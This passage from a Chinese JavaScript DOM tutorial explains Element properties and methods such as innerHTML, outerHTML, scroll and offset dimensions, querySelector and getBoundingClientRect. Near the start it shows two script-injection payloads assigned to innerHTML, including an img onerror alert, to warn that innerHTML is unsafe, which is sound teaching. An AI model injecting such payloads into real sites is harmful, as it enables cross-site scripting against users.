<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;&lt;script&gt;alert(&#x27;haha&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">el.innerHTML = name;</span><br></pre></td></tr></table></figure>
<p>上面代码将脚本插入内容，脚本并不会执行。但是，<code>innerHTML</code>还是有安全风险的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;&lt;img src=x onerror=alert(1)&gt;&quot;</span>;</span><br><span class="line">el.innerHTML = name;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>alert</code>方法是会执行的。因此为了安全考虑，如果插入的是文本，最好用<code>textContent</code>属性代替<code>innerHTML</code>。</p>
<h5 id="6-2-7-Element-outerHTML"><a href="#6-2-7-Element-outerHTML" class="headerlink" title="6.2.7 Element.outerHTML"></a>6.2.7 Element.outerHTML</h5><p><code>Element.outerHTML</code>属性返回一个字符串，表示当前元素节点的所有 HTML 代码，包括该元素本身和所有子元素。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;d&quot;&gt;&lt;p&gt;Hello&lt;/p&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> d = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">d.outerHTML</span><br><span class="line"><span class="comment">// &#x27;&lt;div id=&quot;d&quot;&gt;&lt;p&gt;Hello&lt;/p&gt;&lt;/div&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><code>outerHTML</code>属性是可读写的，对它进行赋值，等于替换掉当前元素。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;container&quot;&gt;&lt;div id=&quot;d&quot;&gt;Hello&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> container = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;container&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> d = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">container.firstChild.nodeName <span class="comment">// &quot;DIV&quot;</span></span><br><span class="line">d.nodeName <span class="comment">// &quot;DIV&quot;</span></span><br><span class="line"></span><br><span class="line">d.outerHTML = <span class="string">&#x27;&lt;p&gt;Hello&lt;/p&gt;&#x27;</span>;</span><br><span class="line">container.firstChild.nodeName <span class="comment">// &quot;P&quot;</span></span><br><span class="line">d.nodeName <span class="comment">// &quot;DIV&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，变量<code>d</code>代表子节点，它的<code>outerHTML</code>属性重新赋值以后，内层的<code>div</code>元素就不存在了，被<code>p</code>元素替换了。但是，变量<code>d</code>依然指向原来的div元素，这表示被替换的<code>DIV</code>元素还存在于内存中。</p>
<p>注意，如果一个节点没有父节点，设置<code>outerHTML</code>属性会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">div.outerHTML = <span class="string">&#x27;&lt;p&gt;test&lt;/p&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">// DOMException: This element has no parent node.</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>div</code>元素没有父节点，设置<code>outerHTML</code>属性会报错。</p>
<h5 id="6-2-8-Element-clientHeight，Element-clientWidth"><a href="#6-2-8-Element-clientHeight，Element-clientWidth" class="headerlink" title="6.2.8 Element.clientHeight，Element.clientWidth"></a>6.2.8 Element.clientHeight，Element.clientWidth</h5><p><code>Element.clientHeight</code>属性返回一个整数值，表示元素节点的 CSS 高度（单位像素），只对块级元素生效，对于行内元素返回<code>0</code>。如果块级元素没有设置 CSS 高度，则返回实际高度。</p>
<p>除了元素本身的高度，它还包括<code>padding</code>部分，但是不包括<code>border</code>、<code>margin</code>。如果有水平滚动条，还要减去水平滚动条的高度。注意，这个值始终是整数，如果是小数会被四舍五入。</p>
<p><code>Element.clientWidth</code>属性返回元素节点的 CSS 宽度，同样只对块级元素有效，也是只包括元素本身的宽度和<code>padding</code>，如果有垂直滚动条，还要减去垂直滚动条的宽度。</p>
<p><code>document.documentElement</code>的<code>clientHeight</code>属性，返回当前视口的高度（即浏览器窗口的高度），等同于<code>window.innerHeight</code>属性减去水平滚动条的高度（如果有的话）。<code>document.body</code>的高度则是网页的实际高度。一般来说，<code>document.body.clientHeight</code>大于<code>document.documentElement.clientHeight</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 视口高度</span></span><br><span class="line"><span class="built_in">document</span>.documentElement.clientHeight</span><br><span class="line"></span><br><span class="line"><span class="comment">// 网页总高度</span></span><br><span class="line"><span class="built_in">document</span>.body.clientHeight</span><br></pre></td></tr></table></figure>

<h5 id="6-2-9-Element-clientLeft，Element-clientTop"><a href="#6-2-9-Element-clientLeft，Element-clientTop" class="headerlink" title="6.2.9 Element.clientLeft，Element.clientTop"></a>6.2.9 Element.clientLeft，Element.clientTop</h5><p><code>Element.clientLeft</code>属性等于元素节点左边框（left border）的宽度（单位像素），不包括左侧的<code>padding</code>和<code>margin</code>。如果没有设置左边框，或者是行内元素（<code>display: inline</code>），该属性返回<code>0</code>。该属性总是返回整数值，如果是小数，会四舍五入。</p>
<p><code>Element.clientTop</code>属性等于网页元素顶部边框的宽度（单位像素），其他特点都与<code>clientLeft</code>相同。</p>
<h5 id="6-2-10-Element-scrollHeight，Element-scrollWidth"><a href="#6-2-10-Element-scrollHeight，Element-scrollWidth" class="headerlink" title="6.2.10 Element.scrollHeight，Element.scrollWidth"></a>6.2.10 Element.scrollHeight，Element.scrollWidth</h5><p><code>Element.scrollHeight</code>属性返回一个整数值（小数会四舍五入），表示当前元素的总高度（单位像素），包括溢出容器、当前不可见的部分。它包括<code>padding</code>，但是不包括<code>border</code>、<code>margin</code>以及水平滚动条的高度（如果有水平滚动条的话），还包括伪元素（<code>::before</code>或<code>::after</code>）的高度。</p>
<p><code>Element.scrollWidth</code>属性表示当前元素的总宽度（单位像素），其他地方都与<code>scrollHeight</code>属性类似。这两个属性只读。</p>
<p>整张网页的总高度可以从<code>document.documentElement</code>或<code>document.body</code>上读取。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回网页的总高度</span></span><br><span class="line"><span class="built_in">document</span>.documentElement.scrollHeight</span><br><span class="line"><span class="built_in">document</span>.body.scrollHeight</span><br></pre></td></tr></table></figure>
<p>注意，如果元素节点的内容出现溢出，即使溢出的内容是隐藏的，<code>scrollHeight</code>属性仍然返回元素的总高度。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;myDiv&quot; style=&quot;height: 200px; overflow: hidden;&quot;&gt;...&lt;div&gt;</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;myDiv&#x27;</span>).scrollHeight <span class="comment">// 356</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，即使<code>myDiv</code>元素的 CSS 高度只有<code>200</code>像素，且溢出部分不可见，但是<code>scrollHeight</code>仍然会返回该元素的原始高度。</p>
<h5 id="6-2-11-Element-scrollLeft，Element-scrollTop"><a href="#6-2-11-Element-scrollLeft，Element-scrollTop" class="headerlink" title="6.2.11 Element.scrollLeft，Element.scrollTop"></a>6.2.11 Element.scrollLeft，Element.scrollTop</h5><p><code>Element.scrollLeft</code>属性表示当前元素的水平滚动条向右侧滚动的像素数量，<code>Element.scrollTop</code>属性表示当前元素的垂直滚动条向下滚动的像素数量。对于那些没有滚动条的网页元素，这两个属性总是等于0。</p>
<p>如果要查看整张网页的水平的和垂直的滚动距离，要从<code>document.documentElement</code>元素上读取。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.documentElement.scrollLeft</span><br><span class="line"><span class="built_in">document</span>.documentElement.scrollTop</span><br></pre></td></tr></table></figure>
<p>这两个属性都可读写，设置该属性的值，会导致浏览器将当前元素自动滚动到相应的位置。</p>
<h5 id="6-2-12-Element-offsetParent"><a href="#6-2-12-Element-offsetParent" class="headerlink" title="6.2.12 Element.offsetParent"></a>6.2.12 Element.offsetParent</h5><p><code>Element.offsetParent</code>属性返回最靠近当前元素的、并且 CSS 的<code>position</code>属性不等于<code>static</code>的上层元素。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div style=<span class="string">&quot;position: absolute;&quot;</span>&gt;</span><br><span class="line">  &lt;p&gt;</span><br><span class="line">    &lt;span&gt;Hello&lt;/span&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>span</code>元素的<code>offsetParent</code>属性就是<code>div</code>元素。</p>
<p>该属性主要用于确定子元素位置偏移的计算基准，<code>Element.offsetTop</code>和<code>Element.offsetLeft</code>就是<code>offsetParent</code>元素计算的。</p>
<p>如果该元素是不可见的（<code>display</code>属性为<code>none</code>），或者位置是固定的（<code>position</code>属性为<code>fixed</code>），则<code>offsetParent</code>属性返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div style=<span class="string">&quot;position: absolute;&quot;</span>&gt;</span><br><span class="line">  &lt;p&gt;</span><br><span class="line">    &lt;span style=<span class="string">&quot;display: none;&quot;</span>&gt;Hello&lt;/span&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>span</code>元素的<code>offsetParent</code>属性是<code>null</code>。</p>
<p>如果某个元素的所有上层节点的<code>position</code>属性都是<code>static</code>，则<code>Element.offsetParent</code>属性指向<code>&lt;body&gt;</code>元素。</p>
<h5 id="6-2-13-Element-offsetHeight，Element-offsetWidth"><a href="#6-2-13-Element-offsetHeight，Element-offsetWidth" class="headerlink" title="6.2.13 Element.offsetHeight，Element.offsetWidth"></a>6.2.13 Element.offsetHeight，Element.offsetWidth</h5><p><code>Element.offsetHeight</code>属性返回一个整数，表示元素的 CSS 垂直高度（单位像素），包括元素本身的高度、<code>padding</code> 和 <code>border</code>，以及水平滚动条的高度（如果存在滚动条）。</p>
<p><code>Element.offsetWidth</code>属性表示元素的 CSS 水平宽度（单位像素），其他都与<code>Element.offsetHeight</code>一致。</p>
<p>这两个属性都是只读属性，只比<code>Element.clientHeight</code>和<code>Element.clientWidth</code>多了边框的高度或宽度。如果元素的 CSS 设为不可见（比如<code>display: none;</code>），则返回<code>0</code>。</p>
<h5 id="6-2-14-Element-offsetLeft，Element-offsetTop"><a href="#6-2-14-Element-offsetLeft，Element-offsetTop" class="headerlink" title="6.2.14 Element.offsetLeft，Element.offsetTop"></a>6.2.14 Element.offsetLeft，Element.offsetTop</h5><p><code>Element.offsetLeft</code>返回当前元素左上角相对于<code>Element.offsetParent</code>节点的水平位移，<code>Element.offsetTop</code>返回垂直位移，单位为像素。通常，这两个值是指相对于父节点的位移。</p>
<p>下面的代码可以算出元素左上角相对于整张网页的坐标。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getElementPosition</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> y = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (e !== <span class="literal">null</span>)  &#123;</span><br><span class="line">    x += e.offsetLeft;</span><br><span class="line">    y += e.offsetTop;</span><br><span class="line">    e = e.offsetParent;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;<span class="attr">x</span>: x, <span class="attr">y</span>: y&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="6-2-15-Element-style"><a href="#6-2-15-Element-style" class="headerlink" title="6.2.15 Element.style"></a>6.2.15 Element.style</h5><p>每个元素节点都有<code>style</code>用来读写该元素的行内样式信息，具体介绍参见《CSS 操作》一章。</p>
<h5 id="6-2-16-Element-children，Element-childElementCount"><a href="#6-2-16-Element-children，Element-childElementCount" class="headerlink" title="6.2.16 Element.children，Element.childElementCount"></a>6.2.16 Element.children，Element.childElementCount</h5><p><code>Element.children</code>属性返回一个类似数组的对象（<code>HTMLCollection</code>实例），包括当前元素节点的所有子元素。如果当前元素没有子元素，则返回的对象包含零个成员。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (para.children.length) &#123;</span><br><span class="line">  <span class="keyword">var</span> children = para.children;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; children.length; i++) &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码遍历了<code>para</code>元素的所有子元素。</p>
<p>这个属性与<code>Node.childNodes</code>属性的区别是，它只包括元素类型的子节点，不包括其他类型的子节点。</p>
<p><code>Element.childElementCount</code>属性返回当前元素节点包含的子元素节点的个数，与<code>Element.children.length</code>的值相同。</p>
<h5 id="6-2-17-Element-firstElementChild，Element-lastElementChild"><a href="#6-2-17-Element-firstElementChild，Element-lastElementChild" class="headerlink" title="6.2.17 Element.firstElementChild，Element.lastElementChild"></a>6.2.17 Element.firstElementChild，Element.lastElementChild</h5><p><code>Element.firstElementChild</code>属性返回当前元素的第一个元素子节点，<code>Element.lastElementChild</code>返回最后一个元素子节点。</p>
<p>如果没有元素子节点，这两个属性返回<code>null</code>。</p>
<h5 id="6-2-18-Element-nextElementSibling，Element-previousElementSibling"><a href="#6-2-18-Element-nextElementSibling，Element-previousElementSibling" class="headerlink" title="6.2.18 Element.nextElementSibling，Element.previousElementSibling"></a>6.2.18 Element.nextElementSibling，Element.previousElementSibling</h5><p><code>Element.nextElementSibling</code>属性返回当前元素节点的后一个同级元素节点，如果没有则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;div-01&quot;&gt;Here is div-01&lt;/div&gt;</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;div-02&quot;&gt;Here is div-02&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> el = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;div-01&#x27;</span>);</span><br><span class="line">el.nextElementSibling</span><br><span class="line"><span class="comment">// &lt;div id=&quot;div-02&quot;&gt;Here is div-02&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>Element.previousElementSibling</code>属性返回当前元素节点的前一个同级元素节点，如果没有则返回<code>null</code>。</p>
<h4 id="6-3-实例方法"><a href="#6-3-实例方法" class="headerlink" title="6.3 实例方法"></a>6.3 实例方法</h4><h5 id="6-3-1-属性相关方法"><a href="#6-3-1-属性相关方法" class="headerlink" title="6.3.1 属性相关方法"></a>6.3.1 属性相关方法</h5><p>元素节点提供六个方法，用来操作属性。</p>
<ul>
<li><code>getAttribute()</code>：读取某个属性的值</li>
<li><code>getAttributeNames()</code>：返回当前元素的所有属性名</li>
<li><code>setAttribute()</code>：写入属性值</li>
<li><code>hasAttribute()</code>：某个属性是否存在</li>
<li><code>hasAttributes()</code>：当前元素是否有属性</li>
<li><code>removeAttribute()</code>：删除属性</li>
</ul>
<p>这些方法的介绍请看《属性的操作》一章。</p>
<h5 id="6-3-2-Element-querySelector"><a href="#6-3-2-Element-querySelector" class="headerlink" title="6.3.2 Element.querySelector()"></a>6.3.2 Element.querySelector()</h5><p><code>Element.querySelector</code>方法接受 CSS 选择器作为参数，返回父元素的第一个匹配的子元素。如果没有找到匹配的子元素，就返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> content = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;content&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> el = content.querySelector(<span class="string">&#x27;p&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码返回<code>content</code>节点的第一个p元素。</p>
<p><code>Element.querySelector</code>方法可以接受任何复杂的 CSS 选择器。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.querySelector(<span class="string">&quot;style[type=&#x27;text/css&#x27;], style:not([type])&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>注意，这个方法无法选中伪元素。</p>
<p>它可以接受多个选择器，它们之间使用逗号分隔。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">element.querySelector(<span class="string">&#x27;div, p&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>上面代码返回element的第一个<code>div</code>或<code>p</code>子元素。</p>
<p>需要注意的是，浏览器执行<code>querySelector</code>方法时，是先在全局范围内搜索给定的 CSS 选择器，然后过滤出哪些属于当前元素的子元素。因此，会有一些违反直觉的结果，下面是一段 HTML 代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">&lt;blockquote id=<span class="string">&quot;outer&quot;</span>&gt;</span><br><span class="line">  &lt;p&gt;Hello&lt;/p&gt;</span><br><span class="line">  &lt;div id=<span class="string">&quot;inner&quot;</span>&gt;</span><br><span class="line">    &lt;p&gt;World&lt;/p&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/blockquote&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>那么，像下面这样查询的话，实际上返回的是第一个<code>p</code>元素，而不是第二个。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> outer = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;outer&#x27;</span>);</span><br><span class="line">outer.querySelector(<span class="string">&#x27;div p&#x27;</span>)</span><br><span class="line"><span class="comment">// &lt;p&gt;Hello&lt;/p&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="6-3-3-Element-querySelectorAll"><a href="#6-3-3-Element-querySelectorAll" class="headerlink" title="6.3.3 Element.querySelectorAll()"></a>6.3.3 Element.querySelectorAll()</h5><p><code>Element.querySelectorAll</code>方法接受 CSS 选择器作为参数，返回一个<code>NodeList</code>实例，包含所有匹配的子元素。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> el = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#test&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> matches = el.querySelectorAll(<span class="string">&#x27;div.highlighted &gt; p&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>该方法的执行机制与<code>querySelector</code>方法相同，也是先在全局范围内查找，再过滤出当前元素的子元素。因此，选择器实际上针对整个文档的。</p>
<p>它也可以接受多个 CSS 选择器，它们之间使用逗号分隔。如果选择器里面有伪元素的选择器，则总是返回一个空的<code>NodeList</code>实例。</p>
<h5 id="6-3-4-Element-getElementsByClassName"><a href="#6-3-4-Element-getElementsByClassName" class="headerlink" title="6.3.4 Element.getElementsByClassName()"></a>6.3.4 Element.getElementsByClassName()</h5><p><code>Element.getElementsByClassName</code>方法返回一个<code>HTMLCollection</code>实例，成员是当前元素节点的所有具有指定 class 的子元素节点。该方法与<code>document.getElementsByClassName</code>方法的用法类似，只是搜索范围不是整个文档，而是当前元素节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">element.getElementsByClassName(<span class="string">&#x27;red test&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>注意，该方法的参数大小写敏感。</p>
<p>由于<code>HTMLCollection</code>实例是一个活的集合，<code>document</code>对象的任何变化会立刻反应到实例，下面的代码不会生效。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;example&quot;&gt;</span></span><br><span class="line"><span class="comment">//   &lt;p class=&quot;foo&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">//   &lt;p class=&quot;foo&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">// &lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> element = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;example&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> matches = element.getElementsByClassName(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i&lt; matches.length; i++) &#123;</span><br><span class="line">  matches[i].classList.remove(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">  matches.item(i).classList.add(<span class="string">&#x27;bar&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 执行后，HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;example&quot;&gt;</span></span><br><span class="line"><span class="comment">//   &lt;p&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">//   &lt;p class=&quot;foo bar&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">// &lt;/div&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>matches</code>集合的第一个成员，一旦被拿掉 class 里面的<code>foo</code>，就会立刻从<code>matches</code>里面消失，导致出现上面的结果。</p>
<h5 id="6-3-5-Element-getElementsByTagName"><a href="#6-3-5-Element-getElementsByTagName" class="headerlink" title="6.3.5 Element.getElementsByTagName()"></a>6.3.5 Element.getElementsByTagName()</h5><p><code>Element.getElementsByTagName()</code>方法返回一个<code>HTMLCollection</code>实例，成员是当前节点的所有匹配指定标签名的子元素节点。该方法与<code>document.getElementsByClassName()</code>方法的用法类似，只是搜索范围不是整个文档，而是当前元素节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> table = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;forecast-table&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cells = table.getElementsByTagName(<span class="string">&#x27;td&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>注意，该方法的参数是大小写不敏感的，因为 HTML 标签名也是大小写不敏感。</p>
<h5 id="6-3-6-Element-closest"><a href="#6-3-6-Element-closest" class="headerlink" title="6.3.6 Element.closest()"></a>6.3.6 Element.closest()</h5><p><code>Element.closest</code>方法接受一个 CSS 选择器作为参数，返回匹配该选择器的、最接近当前节点的一个祖先节点（包括当前节点本身）。如果没有任何节点匹配 CSS 选择器，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;article&gt;</span></span><br><span class="line"><span class="comment">//   &lt;div id=&quot;div-01&quot;&gt;Here is div-01</span></span><br><span class="line"><span class="comment">//     &lt;div id=&quot;div-02&quot;&gt;Here is div-02</span></span><br><span class="line"><span class="comment">//       &lt;div id=&quot;div-03&quot;&gt;Here is div-03&lt;/div&gt;</span></span><br><span class="line"><span class="comment">//     &lt;/div&gt;</span></span><br><span class="line"><span class="comment">//   &lt;/div&gt;</span></span><br><span class="line"><span class="comment">// &lt;/article&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> div03 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;div-03&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// div-03 最近的祖先节点</span></span><br><span class="line">div03.closest(<span class="string">&quot;#div-02&quot;</span>) <span class="comment">// div-02</span></span><br><span class="line">div03.closest(<span class="string">&quot;div div&quot;</span>) <span class="comment">// div-03</span></span><br><span class="line">div03.closest(<span class="string">&quot;article &gt; div&quot;</span>) <span class="comment">//div-01</span></span><br><span class="line">div03.closest(<span class="string">&quot;:not(div)&quot;</span>) <span class="comment">// article</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，由于<code>closest</code>方法将当前节点也考虑在内，所以第二个<code>closest</code>方法返回<code>div-03</code>。</p>
<h5 id="6-3-7-Element-matches"><a href="#6-3-7-Element-matches" class="headerlink" title="6.3.7 Element.matches()"></a>6.3.7 Element.matches()</h5><p><code>Element.matches</code>方法返回一个布尔值，表示当前元素是否匹配给定的 CSS 选择器。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (el.matches(<span class="string">&#x27;.someClass&#x27;</span>)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Match!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="6-3-8-事件相关方法"><a href="#6-3-8-事件相关方法" class="headerlink" title="6.3.8 事件相关方法"></a>6.3.8 事件相关方法</h5><p>以下三个方法与<code>Element</code>节点的事件相关。这些方法都继承自<code>EventTarget</code>接口，详见相关章节。</p>
<ul>
<li>Element.addEventListener()：添加事件的回调函数</li>
<li>Element.removeEventListener()：移除事件监听函数</li>
<li>Element.dispatchEvent()：触发事件<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">element.addEventListener(<span class="string">&#x27;click&#x27;</span>, listener, <span class="literal">false</span>);</span><br><span class="line">element.removeEventListener(<span class="string">&#x27;click&#x27;</span>, listener, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> event = <span class="keyword">new</span> Event(<span class="string">&#x27;click&#x27;</span>);</span><br><span class="line">element.dispatchEvent(event);</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="6-3-9-Element-scrollIntoView"><a href="#6-3-9-Element-scrollIntoView" class="headerlink" title="6.3.9 Element.scrollIntoView()"></a>6.3.9 Element.scrollIntoView()</h5><p><code>Element.scrollIntoView</code>方法滚动当前元素，进入浏览器的可见区域，类似于设置<code>window.location.hash</code>的效果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">el.scrollIntoView(); <span class="comment">// 等同于el.scrollIntoView(true)</span></span><br><span class="line">el.scrollIntoView(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>该方法可以接受一个布尔值作为参数。如果为<code>true</code>，表示元素的顶部与当前区域的可见部分的顶部对齐（前提是当前区域可滚动）；如果为<code>false</code>，表示元素的底部与当前区域的可见部分的尾部对齐（前提是当前区域可滚动）。如果没有提供该参数，默认为<code>true</code>。</p>
<h5 id="6-3-10-Element-getBoundingClientRect"><a href="#6-3-10-Element-getBoundingClientRect" class="headerlink" title="6.3.10 Element.getBoundingClientRect()"></a>6.3.10 Element.getBoundingClientRect()</h5><p><code>Element.getBoundingClientRect</code>方法返回一个对象，提供当前元素节点的大小、位置等信息，基本上就是 CSS 盒状模型的所有信息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rect = obj.getBoundingClientRect();</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>getBoundingClientRect</code>方法返回的<code>rect</code>对象，具有以下属性（全部为只读）。</p>
<ul>
<li><code>x</code>：元素左上角相对于视口的横坐标</li>
<li><code>y</code>：元素左上角相对于视口的纵坐标</li>
<li><code>height</code>：元素高度</li>
<li><code>width</code>：元素宽度</li>
<li><code>left</code>：元素左上角相对于视口的横坐标，与x属性相等</li>
<li><code>right</code>：元素右边界相对于视口的横坐标（等于<code>x + width</code>）</li>
<li><code>top</code>：元素顶部相对于视口的纵坐标，与y属性相等</li>
<li><code>bottom</code>：元素底部相对于视口的纵坐标（等于<code>y + height</code>）</li>
</ul>
<p>由于元素相对于视口（viewport）的位置，会随着页面滚动变化，因此表示位置的四个属性值，都不是固定不变的。如果想得到绝对位置，可以将<code>left</code>属性加上<code>window.scrollX，top</code>属性加上<code>window.scrollY</code>。</p>
<p>注意，<code>getBoundingClientRect</code>方法的所有属性，都把边框（<code>border</code>属性）算作元素的一部分。也就是说，都是从边框外缘的各个点来计算。因此，<code>width和height</code>包括了元素本身+<code>padding</code>+<code>border</code>。</p>
<p>另外，上面的这些属性，都是继承自原型的属性，<code>Object.keys</code>会返回一个空数组，这一点也需要注意。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rect = <span class="built_in">document</span>.body.getBoundingClientRect();</span><br><span class="line"><span class="built_in">Object</span>.keys(rect) <span class="comment">// []</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>rect</code>对象没有自身属性，而<code>Object.keys</code>方法只返回对象自身的属性，所以返回了一个空数组。</p>
<h5 id="6-3-11-Element-getClientRects"><a href="#6-3-11-Element-getClientRects" class="headerlink" title="6.3.11 Element.getClientRects()"></a>6.3.11 Element.getClientRects()</h5><p><code>Element.getClientRects</code>方法返回一个类似数组的对象，里面是当前元素在页面上形成的所有矩形（所以方法名中的Rect用的是复数）。每个矩形都有<code>bottom</code>、<code>height</code>、<code>left</code>、<code>right</code>、<code>top</code>和<code>width</code>六个属性，表示它们相对于视口的四个坐标，以及本身的高度和宽度。</p>
<p>对于盒状元素（比如<code>&lt;div&gt;</code>和<code>&lt;p&gt;</code>），该方法返回的对象中只有该元素一个成员。对于行内元素（比如<code>&lt;span&gt;</code>、<code>&lt;a&gt;</code>、<code>&lt;em&gt;</code>），该方法返回的对象有多少个成员，取决于该元素在页面上占据多少行。这是它和<code>Element.getBoundingClientRect()</code>方法的主要区别，后者对于行内元素总是返回一个矩形。</p>
